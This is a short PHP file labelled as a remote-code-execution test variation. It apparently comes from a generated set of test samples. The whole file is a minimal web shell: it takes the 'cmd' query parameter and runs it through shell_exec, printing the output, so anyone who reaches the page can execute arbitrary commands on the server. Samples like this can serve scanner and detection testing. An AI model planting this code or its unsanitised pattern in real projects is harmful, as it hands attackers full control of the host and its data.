<?php
// RCE test variation #1438
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>